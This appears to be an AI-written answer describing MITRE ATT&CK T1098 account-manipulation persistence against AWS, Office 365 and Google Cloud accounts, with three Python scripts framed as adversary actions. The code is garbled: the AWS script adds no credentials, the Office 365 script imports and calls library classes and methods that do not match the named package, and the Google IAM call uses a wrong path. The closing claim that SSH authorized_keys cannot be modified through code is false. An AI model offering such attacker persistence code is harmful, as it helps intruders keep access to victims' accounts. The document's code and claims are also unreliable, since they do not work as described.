Adversary-controlled credentials in a cloud account:\n   - Using the AWS SDK for Python (boto3), the adversary can add their credentials to a target cloud account and maintain persistent access.\n\n2. Additional permission levels in an adversary-controlled email account:\n   - Using Office365-REST-Python-Client, the adversary can grant additional permission levels to their adversary-controlled email account, allowing them to maintain persistent access.\n\n3. Additional roles or permissions in an adversary-controlled cloud account:\n   - Using the Google API Python library (google-api-python-client), the adversary can add additional roles or permissions to their adversary-controlled cloud account, allowing them to maintain persistent access.\n\nCode (Method 1):\n```python\nimport boto3\n\ndef add_adversary_credentials(cloud_account, adversary_credentials):\n    # Connect to AWS using adversary-controlled credentials\n    sts_client = boto3.client('sts', aws_access_key_id=adversary_credentials['access_key'],\n                              aws_secret_access_key=adversary_credentials['secret_key'], region_name='us-east-1')\n\n    # Assume a role in the target cloud account\n    response = sts_client.assume_role(RoleArn=cloud_account['role_arn'], RoleSessionName='session')\n\n    # Use the assumed role credentials to perform actions in the cloud account\n    # For example, list the S3 buckets in the account\n    s3_client = boto3.client('s3', aws_access_key_id=response['Credentials']['AccessKeyId'],\n                             aws_secret_access_key=response['Credentials']['SecretAccessKey'],\n                             aws_session_token=response['Credentials']['SessionToken'], region_name='us-east-1')\n    response = s3_client.list_buckets()\n    print(response['Buckets'])\n```\n\nCode (Method 2):\n```python\nimport O365\n\ndef grant_additional_permissions(email_account, additional_permissions):\n    # Connect to the adversary-controlled email account\n    credentials = ('client_id', 'client_secret')\n    tenant_url = 'https://login.microsoftonline.com/{}'.format(email_account['tenant_id'])\n    mailbox = O365.MailBox(credentials, (email_account['username'], email_account['password']), tenant_url=tenant_url)\n    if mailbox.authenticate():\n        # Grant additional permissions to the mailbox\n        for permission in additional_permissions:\n            mailbox.add_delegate(permission)\n```\n\nCode (Method 3):\n```python\nfrom googleapiclient.discovery import build\n\ndef add_additional_roles(cloud_account, additional_roles):\n    # Connect to the adversary-controlled cloud account\n    credentials = cloud_account['credentials']\n    service = build('iam', 'v1', credentials=credentials)\n\n    # Add additional roles or permissions to the cloud account\n    for role in additional_roles:\n        request = service.projects().serviceAccounts().roles().create(name='projects/{}/roles/{}'.format(\n            cloud_account['project_id'], role['role_id']), body=role['body'])\n        response = request.execute()\n        print(response)\n```\n\nPlease note that the above code examples are simplified and may require modifications to fit specific use cases. Additionally, these examples assume that the required credentials and configurations are available.\n\nRegarding the last two methods listed (modifying SSH authorized_keys file and registering a device to an adversary-controlled account), they cannot be implemented directly through code execution since they involve modifying system-level configurations or interacting with physical devices, which are beyond the scope of programmatically manipulating accounts as stated in the T1098 technique."
